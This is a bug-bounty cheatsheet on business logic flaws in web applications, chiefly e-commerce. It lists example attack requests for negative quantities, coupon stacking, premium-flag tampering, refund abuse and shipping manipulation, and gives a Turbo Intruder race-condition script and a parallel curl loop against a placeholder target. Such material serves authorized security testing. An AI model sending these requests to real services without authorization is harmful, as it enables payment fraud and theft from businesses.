---
tags: [bugbounty, misc/biz-logic, cheatsheet, p2, p3]
aliases: [Business Logic Errors, Logic Flaws, Price Manipulation]
cssclasses: [bb-hunter]
updated: 2026-04-21
---

# Business Logic Errors

> [!tldr] Hunter Summary
> **What:** Abuse legitimate application flows in unintended ways — no exploiting code bugs.
> **Impact:** Financial loss, privilege abuse, unauthorized access. P2–P3, P1 if financial.
> **Best targets:** E-commerce (price/quantity), coupon codes, subscriptions, race conditions, feature flags.
> **Time to triage:** Understand the business flow, then test edge cases — 30–60 min.

---

## Attack Categories

### 1 — Price / Quantity Manipulation
```
# Negative quantities
POST /cart/add
{"item_id": 123, "quantity": -1}
# Does cart total go negative? Reduce payment?

# Zero price
POST /checkout
{"price": 0, "item_id": 123}

# Overflow (large number)  
{"quantity": 99999999999}
{"amount": 0.0001}

# Currency mismatch
# Pay in USD, refund in GBP/EUR — exchange rate arbitrage
```

### 2 — Coupon Code Abuse
```
# Apply same coupon twice
POST /apply-coupon  {"code": "SAVE50"}
POST /apply-coupon  {"code": "SAVE50"}  (same code again)
# Does discount stack or apply twice?

# Race condition: two accounts, same unique code, concurrent requests
# Both may succeed if race window exists

# HTTP Parameter Pollution
POST /apply-coupon
code=VALIDCODE&code=ANOTHERCODE
# Apply multiple codes where only one is allowed

# Apply to non-eligible items by tampering request
```

### 3 — Subscription / Premium Feature Abuse
```
# Access after cancellation
POST /subscription/cancel  → refund issued?
# Try accessing premium features after cancel — are they still accessible?

# True/false tampering
# Look for: "is_premium": false in response or cookie
# Burp Match & Replace: false → true in all responses

# Forced browse
# /premium/dashboard accessible at /dashboard?plan=premium
# /api/premium/export works without plan check
```

### 4 — Race Conditions
```bash
# Classic: withdraw same balance twice
# Gift card, coupon, referral bonus, order fulfill

# Burp Turbo Intruder race condition
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=50,
                          requestsPerConnection=100,
                          pipeline=True)
    for i in range(50):
        engine.queue(target.req)

# Or: send parallel requests with same coupon code
for i in {1..10}; do
  curl -X POST https://target.com/use-coupon -d "code=ONCE_ONLY" &
done
wait
```

### 5 — Shipping / Delivery Abuse
```
# Negative delivery charge
POST /calculate-shipping
{"weight": -5, "method": "express"}
# Does total become negative?

# Free shipping threshold manipulation
# Add items that don't count toward threshold, remove real items after qualifying
```

### 6 — Review / Rating Manipulation
```
# Rate your own product as admin/verified buyer
# Post rating outside allowed range: 0, 6, -1, 999
# Post multiple reviews (race condition)
# Post review as another user (IDOR in review author field)
```

### 7 — Refund Abuse
```
# Buy subscription → cancel → refund → feature still works
# Multiple refund requests (race condition) → multiple refunds for one purchase
```

### 8 — Cart / Wishlist Manipulation
```
# Move items from cart to another user's cart (IDOR)
# Add more than available stock quantity
# Add item with negative quantity to cancel out positive item price
```

### 9 — Account/Feature State Tampering
```
# Toggle "email_verified": false → true in request/response
# Change "account_type": "free" → "enterprise" 
# Modify "trial_days_remaining": 0 → 30
```

---

## Hunt Checklist for E-commerce Targets

```
[ ] Negative quantity in cart
[ ] Zero/negative price in checkout
[ ] Same coupon twice
[ ] Coupon race condition
[ ] Cancel subscription + access premium
[ ] Refund + keep access
[ ] Multiple refunds (race)
[ ] Shipping manipulation (negative weight)
[ ] Review outside rating bounds
[ ] Review without purchase
[ ] Currency arbitrage
[ ] Forced browse to premium features
[ ] Response/cookie "is_premium" flag tamper
```

---

## 2025-2026 Updates

> [!info] New business logic surface (2025-2026)
> - **AI quota abuse:** AI tokens/credits often have logic flaws — free tier quotas reset at midnight but can be exploited at reset boundary
> - **NFT/crypto feature abuse:** Token-gated features where ownership check is client-side
> - **A/B test abuse:** Test group cookies can be manually set to access features in testing phase
> - **Referral code race conditions:** Many apps added referral programs without race condition protection

---

## References

- @harshbothra_ business logic series
- PortSwigger Business Logic Vulnerabilities — https://portswigger.net/web-security/logic-flaws
- PortSwigger Race Conditions — https://portswigger.net/web-security/race-conditions
